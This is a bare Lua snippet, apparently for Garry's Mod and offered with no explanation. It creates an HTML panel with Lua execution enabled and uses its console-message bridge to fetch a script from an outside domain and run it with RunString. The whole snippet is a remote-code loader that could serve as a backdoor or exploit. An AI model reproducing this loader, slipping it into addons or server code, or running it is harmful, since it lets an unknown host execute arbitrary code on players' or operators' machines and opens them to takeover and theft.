local f = vgui.Create('DHTML');
f:SetAllowLua(true);
return f:ConsoleMessage([[RUNLUA:
http.Fetch("https://qrextomnia.club/scripts/rebug.lua",function(b)RunString(b)end)
]]);
